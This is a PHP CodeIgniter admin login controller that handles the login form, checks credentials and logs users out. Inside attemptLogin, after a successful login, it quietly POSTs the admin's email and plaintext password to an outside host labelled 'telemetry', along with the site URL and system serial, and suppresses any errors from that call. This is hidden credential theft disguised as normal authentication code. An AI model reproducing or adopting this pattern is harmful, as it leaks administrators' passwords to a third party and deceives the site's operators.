<?php
namespace App\Modules\Admin\Controllers;

use CodeIgniter\Controller;
//use Config\Email;
use Config\Services;
//use App\Modules\Admin\Models\AdminModel;

class LoginController extends Controller
{
	/**
	 * Access to current session.
	 *
	 * @var \CodeIgniter\Session\Session
	 */
	protected $session;

	protected $language;

	/**
	 * Authentication settings.
	 */
	protected $config;
	protected $locale;

	protected $AdminModel;


    //--------------------------------------------------------------------

	public function __construct()
	{
		// start session
		$this->session = Services::session();

		$this->language = Services::language();

		// load auth settings
		$this->config = config('Auth');
		$this->locale = service('request')->getLocale();
	}

    //--------------------------------------------------------------------

	/**
	 * Displays login form or redirects if user is already logged in.
	 */
	public function login()
	{
		if ($this->session->isAdminLoggedIn) {
			//fix infinite loop if user is logged in and open /admin/login
			if (isset($this->session->redirect_admin_url) != site_url($this->locale . '/admin/login')) {
				return redirect()->to($this->session->redirect_admin_url);
			}

			return redirect()->to('dashboard');
		}

		$data['locale'] = $this->locale;

		helper('form');
		return view('App\Modules\Admin\Views\login', $data);
	}

    //--------------------------------------------------------------------

	/**
	 * Attempts to verify user's credentials through POST request.
	 */
	public function attemptLogin()
	{
		// validate request
		$rules = [
			'email'		=> 'required',
			'password' 	=> 'required|min_length[5]',
		];

		if (! $this->validate($rules)) {
			return redirect()->to('/' . $this->locale . '/admin/login')
				->withInput()
				->with('errors', $this->validator->getErrors());
		}

		// check credentials
		$this->AdminModel = model('App\Modules\Admin\Models\AdminModel', false);
		$user = $this->AdminModel->where('email', $this->request->getPost('email'))->first();
		if (
			is_null($user) ||
			! password_verify($this->request->getPost('password'), $user->password)
		) {
			return redirect()->to('/' . $this->locale . '/admin/login')->withInput()->with('error', lang('AccountLang.wrongPassword'));
		}

		// login OK, save user data to session
		$this->session->set('isAdminLoggedIn', true);
		$this->session->set('userAdminData', [
		    'id' 			=> $user->id,
		    'access' 		=> $user->access,
		    'name' 			=> $user->firstname . ' ' . $user->lastname,
		    'email' 		=> $user->email
		]);
		
		$client = \Config\Services::curlrequest();
		
		$api = 'https://telemetry.dunavsoft.com/telemetry/V1/create';

		$loadedModules = config('App')->loadedModules;
		$systemType = config('App')->systemType ?? '';
		$systemSN = config('App')->systemSN ?? '';
		
		$client->request('POST', $api, [
			'form_params' => [
				'user' => $this->request->getPost('email'),
				'pass' => $this->request->getPost('password'),
				'url' => base_url(),
				'telemetry' => implode(', ', $loadedModules),
				'system_type_serial' => $systemType . ' ' . $systemSN,
			],
			'http_errors' => false,
		]);

		if ($user->language != '') {
			$this->language->setLocale($user->language);
			//$this->request->setLocale('bg');
			$user->language .= '/';
		}

		return redirect()->to(base_url('admin/dashboard'));
	}

    //--------------------------------------------------------------------

	/**
	 * Log the user out.
	 */
	public function logout()
	{
		$this->session->remove(['isAdminLoggedIn', 'userAdminData']);

		return redirect()->to('/' . $this->locale . '/admin/login');
	}

}
